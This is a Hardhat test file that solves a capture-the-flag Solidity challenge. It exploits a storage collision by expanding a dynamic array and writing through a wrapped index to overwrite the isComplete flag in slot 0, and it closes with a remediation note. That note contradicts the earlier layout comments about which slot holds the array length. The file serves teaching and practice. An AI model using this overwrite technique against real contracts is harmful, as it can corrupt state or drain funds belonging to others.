import { ethers } from "hardhat";
import { expect } from "chai";
import { BigNumber } from "ethers";

describe("MappingChallenge", function () {
  it("should exploit storage layout and set isComplete to true", async function () {
    const [player] = await ethers.getSigners();

    // Step 1: Deploy the vulnerable contract
    const ChallengeFactory = await ethers.getContractFactory("MappingChallenge");
    const challenge = await ChallengeFactory.connect(player).deploy();
    await challenge.deployed();
    console.log("Challenge deployed at:", challenge.address);

    // --- Storage Layout Recap ---
    // slot 0: isComplete (bool)
    // slot 1: map.length (uint256)
    // dynamic array data starts at: keccak256(1)
    //
    // map[i] is stored at: keccak256(1) + i
    //
    // So to write to slot 0, we must find i such that:
    //     keccak256(1) + i ≡ 0 mod 2^256
    //     => i = 2^256 - keccak256(1)

    // Step 2: Expand map to maximum possible size to bypass length checks
    // Set map.length = 2^256 - 1 by writing to key (2^256 - 2)
    const maxIndex = BigNumber.from(2).pow(256).sub(2); // (2^256 - 2)
    const expandTx = await challenge.set(maxIndex, 0);
    await expandTx.wait();
    console.log("Map length expanded to max to bypass bounds check");

    // Step 3: Calculate keccak256(1) — the base storage slot for map data
    const paddedSlot = ethers.utils.hexZeroPad("0x01", 32); // 32-byte padded slot 1
    const mapDataStart = BigNumber.from(
      ethers.utils.keccak256(paddedSlot) // keccak256(1)
    );
    console.log("map data starts at slot:", mapDataStart.toHexString());

    // Step 4: Find index that maps to slot 0: i = 2^256 - keccak256(1)
    const overwriteIndex = BigNumber.from(2).pow(256).sub(mapDataStart);
    console.log("Index that maps to slot 0 (isComplete):", overwriteIndex.toString());

    // Step 5: Write to that index with value 1 (true)
    const writeTx = await challenge.set(overwriteIndex, 1);
    await writeTx.wait();
    console.log("Overwrite attempt made to isComplete via map[index]");

    // Step 6: Confirm isComplete was set to true
    const isComplete = await challenge.isComplete();
    expect(isComplete).to.be.true;
    console.log("Challenge solved: isComplete is true");
     // --- Remediation Note ---
    // This vulnerability exists because isComplete and map.length share storage slot 0.
    // By extending the dynamic array's length and computing an index that maps to slot 0,
    // we can overwrite the isComplete flag via storage collision.
    //
    // This issue would not be exploitable if:
    // - isComplete was stored in a different slot (e.g., placed after the map definition),
    // - or if explicit bounds checks were enforced on the map index (e.g., key < 2^128).
    //
    // In either case, this test would fail as overwriting slot 0 via set() would no longer be possible.
  
  });
});
